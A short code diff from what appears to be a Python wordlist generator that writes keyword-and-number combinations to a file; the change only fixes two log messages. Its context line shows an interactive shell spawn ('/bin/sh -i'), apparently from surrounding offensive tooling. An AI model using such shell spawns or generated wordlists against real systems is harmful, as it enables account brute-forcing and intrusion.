@@ -736,9 +736,9 @@ exec("/bin/sh -i");
                                                 print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]))
                                                 
                                                 file.write(str(keywords[i]) + str(n) + '\n')
-                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]) + str(n))
+                                                print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(n))
                                                 file.write(str(n) + str(keywords[i]) + '\n')
-                                                print('\u001b[32mWritten\u001b[0m ' + str(n) + str(keywords[i]) + str(keywords[l]))
+                                                print('\u001b[32mWritten\u001b[0m ' + str(n) + str(keywords[i]))
 
                                                 file.write(str(keywords[i]) + str(keywords[l]) + str(n) + '\n')
                                                 print('\u001b[32mWritten\u001b[0m ' + str(keywords[i]) + str(keywords[l]) + str(n))
